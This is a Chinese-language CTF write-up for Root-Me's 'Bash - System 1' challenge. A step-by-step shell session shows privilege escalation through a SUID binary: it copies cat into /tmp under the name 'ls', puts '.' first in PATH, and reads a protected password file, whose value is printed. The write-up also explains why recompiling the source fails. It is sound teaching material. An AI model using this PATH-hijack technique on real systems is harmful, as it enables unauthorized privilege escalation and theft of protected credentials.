# CTF-Solving-Reports
　【App-Script : Bash - System 1】 [[官网入口](https://www.root-me.org/en/Challenges/App-Script/ELF32-System-1)] [[上级分类](https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/rootme/App-Script)]

------

## 考察点

 - SUID权限的可执行文件利用
 - 环境变量 PATH 中含有当前路径 "." 造成的路径胁持
 - 文件权限的传递方式

## 解题思路

> 先直接用脚本讲解正确的解题步骤，后面再解释这个思路是怎么来的）

```shell
# (1) 登入靶机后，首先检查当前的目录环境（当前用户、工作目录、拥有文件、权限等）
app-script-ch11@challenge02:~$ pwd
/challenge/app-script/ch11

# (2) 发现一个具有SUID权限的可执行脚本 ch11、一个只读的C源码文件 ch11.c、一个无法读写隐藏文件 .passwd
#     由此可以猜测最终目标就是要通过某种途径查看 .passwd 的内容
app-script-ch11@challenge02:~$ ll
total 24
dr-xr-x---  2 app-script-ch11-cracked app-script-ch11         4096 Aug 11  2015 ./
drwxr-xr-x 17 root                    root                    4096 Mar 17  2018 ../
-r--r-----  1 app-script-ch11-cracked app-script-ch11-cracked   14 Feb  8  2012 .passwd
-r-sr-x---  1 app-script-ch11-cracked app-script-ch11         7160 Aug 11  2015 ch11*
-r--r-----  1 app-script-ch11         app-script-ch11          153 Aug 11  2015 ch11.c

# (3) 查看C源码，其功能就是调用 ls 系统命令，还很贴心地注释了 gcc 编译命令
app-script-ch11@challenge02:~$ more ch11.c
#include <stdlib.h>
#include <stdio.h>

/* gcc -m32 -o ch11 ch11.c */

int main(void) 
{
        system("ls /challenge/app-script/ch11/.passwd");
        return 0;
}

# (4) 尝试执行 gcc 编译，发现没有权限在当前目录编译
app-script-ch11@challenge02:~$ gcc -m32 -o ch11 ch11.c
Cannot create temporary file in ./: Permission denied
Aborted

# (5) 直接执行 ch11 脚本，通过其输出可以知道这就是从 ch11.c 编译而来的
#     而且这个脚本还具备 SUID 权限，其 owner 为 app-script-ch11-cracked
#     在前面已经知道，.passwd 文件也是同一个 owner，且只有 owner 可读
#     因此到这里就可以明确，最终的目标就是利用 ch11 脚本的 SUID 位特性进行提取查看 .passwd 文件
app-script-ch11@challenge02:~$ ./ch11
/challenge/app-script/ch11/.passwd

# -----------------------------------------------------------
# (?) 这里可能有些同学认为自己“找到了解题方法”：
#         修改 ch11.c 调用的系统命令，如改成 "cat /challenge/app-script/ch11/.passwd"，然后重新编译执行就能达成目的
#         而 ch11.c 是只读的，问题就变成怎么编辑 ch11.c
#
#     这思路其实是错的，这也是出题人希望误导的方向。至于为什么后面再解释，暂时不展开。
#
#     这题的解法其实不是修改 ch11.c 的命令，二是修改其所调用的命令 ls 的语义为 cat 来达到目的
#     简单来说，就是让 ch11 以为自己执行的是 ls ，实际上执行的是 cat（胁持）
# -----------------------------------------------------------

# (6) 需要知道，linux 执行 bash 命令的时候，是从环境变量 PATH 去搜索同名脚本的
#     这里查看一下当前环境变量 PATH 的内容
app-script-ch11@challenge02:/tmp/exp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/opt/tools/checksec/

# (7) 列出的目录大部分都没有权限查看，但最终在 /bin 目录找到了 ls 和 cat 两个命令的脚本文件
#     当然用直接用 find / -name "cat" 命令找也是可以的，会更快
#     可以发现 ls 和 cat 脚本对所有用户都是可读的，这就为接下来的伪造命令创造了条件
#     我们的目的是：把 cat 伪装成 ls
#     但因为不具备 /bin 目录的写权限，因此不能直接在这里操作
#     但又因为有读权限，所以可以复制去其他我们有写权限的目录操作
app-script-ch11@challenge02:~$ cd /bin
app-script-ch11@challenge02:/bin$ ll | grep -w 'ls'
-rwxr-xr-x  1 root root  108708 Mar 10  2016 ls*
app-script-ch11@challenge02:/bin$ ll | grep -w 'cat'
-rwxr-xr-x  1 root root   46884 Mar 10  2016 cat*

# (8) 很自然就可以想到 /tmp 临时目录，查一下，确实具有写权限
app-script-ch11@challenge02:/bin$ cd /
app-script-ch11@challenge02:/$ ll | grep -w 'tmp'
drwxrwx-wt  20 root root 2166784 Dec 30 13:40 tmp/

# (9) 但是因为不具备对 /tmp 目录的读权限，为了方便操作，在 /tmp 目录下再建一个子目录 exp，权限设为 777
app-script-ch11@challenge02:/$ cd /tmp
app-script-ch11@challenge02:/tmp$ mkdir exp
app-script-ch11@challenge02:/tmp$ chmod 777 exp
app-script-ch11@challenge02:/tmp$ cd exp

# (10) 把 /bin/cat 脚本复制到 /tmp/exp 目录下，并重命名为 ls ， 至此伪装就完成了
app-script-ch11@challenge02:/tmp/exp$ cp /bin/cat .
app-script-ch11@challenge02:/tmp/exp$ mv cat ls
app-script-ch11@challenge02:/tmp/exp$ ll
total 2172
drwxrwxrwx  2 app-script-ch11 app-script-ch11    4096 Dec 30 13:41 ./
drwxrwx-wt 21 root            root            2166784 Dec 30 13:41 ../
-rwxr-x---  1 app-script-ch11 app-script-ch11   46884 Dec 30 13:41 ls*

# (11) 前面说过，linux 在执行 bash 命令的时候，是从环境变量 PATH 去搜索同名脚本的
#      而 ~/ch11 脚本所调用的系统命令 ls 在 /bin 目录下
#      为了达到路径胁持的目的，可以把当前目录 "." 添加到环境变量 PATH 的最前面
#      使得 linux 在搜索命令脚本的时候，先从当前目录下找
#      而在当前目录 /tmp/exp 下，我们刚刚创造了一个伪装成 ls 的 cat 脚本
app-script-ch11@challenge02:/tmp/exp$ export PATH=.:$PATH
app-script-ch11@challenge02:/tmp/exp$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/opt/tools/checksec/

# (12) 把当前目录 "." 添加到环境变量 PATH 后，在当前目录执行 ll 命令已经不起作用了
#      原因是 ll 是命令 ls -la 的缩写别名，因此会连带不生效
app-script-ch11@challenge02:/tmp/exp$ ll
ls: unrecognized option '--color=auto'
Try 'ls --help' for more information.

# (13) 最后，只需要 cd 到伪装成 ls 的 cat 脚本所在的目录下（即使得当前目录变成  /tmp/exp ）
#      再直接调用工作目录下的 ch11 脚本，即可通过 路径胁持+伪装命令 达到提权目的
#      最终我们得到了密码，完成挑战
app-script-ch11@challenge02:/tmp/exp$ ~/ch11
!oPe96a/.s8d5
```


## 解题误区

看了评论区，有大部分同学采用了类似这样的一个错误的做法：

1. 把 ch11.c 复制到 /tmp 目录，然后通过 chmod 赋予自己对 ch11.c 的写权限
2. 用 vim 把 system 命令的 ls 修改成 cat，在 /tmp 目录重新 gcc 编译得到新的 ch11 脚本
3. 通过 chmod u+s  赋予 ch11 脚本 SUID 权限，运行 ch11 脚本，最后报错 `Permission denied` 就做不下去了

为什么这样做无法提权？其实看一下 /tmp 目录 gcc 编译出来的  ch11 脚本的 owner 就知道了：

- 新编译的 ch11 脚本的 owner 是当前用户 app-script-ch11
- 而原本在 app-script-ch11 工作目录的 ch11 脚本的 owner 是 app-script-ch11-cracked

换言之新编译的 ch11 脚本的 SUID 位还是 app-script-ch11 自身，是没有办法利用 SUID 的特性在执行脚本的过程中提权为 app-script-ch11-cracked 的。


![](http://exp-blog.com/wp-content/uploads/2018/12/51806aa7157b830a832568f1a12b39cb.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2006~2018%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
